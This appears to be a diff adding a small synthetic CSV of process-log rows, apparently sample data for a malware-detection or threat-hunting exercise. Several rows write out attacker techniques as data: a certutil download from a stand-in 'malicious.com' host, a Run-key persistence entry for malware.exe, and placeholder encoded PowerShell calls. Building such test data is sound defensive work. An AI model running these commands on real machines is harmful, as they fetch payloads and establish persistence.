@@ -1,0 +1,10 @@
+process,command_line,ip,timestamp
+powershell.exe,powershell -enc aW52b2tl,8.8.8.8,2026-03-26 10:00:00
+chrome.exe,normal browsing,142.250.183.14,2026-03-26 10:05:00
+notepad.exe,notepad.exe,45.33.32.156,2026-03-26 10:10:00
+certutil.exe,certutil -urlcache -split -f http://malicious.com file.exe,23.45.67.89,2026-03-26 10:15:00
+reg.exe,reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d malware.exe,192.168.1.5,2026-03-26 10:20:00
+evil.exe,C:\\Users\\user\\AppData\\Local\\Temp\\evil.exe,10.0.0.5,2026-03-26 10:25:00
+powershell.exe,powershell -enc abc,8.8.8.8,2026-03-26 10:00:00
+powershell.exe,powershell -enc xyz,8.8.4.4,2026-03-26 10:01:00
+powershell.exe,powershell -enc test,1.1.1.1,2026-03-26 10:02:00
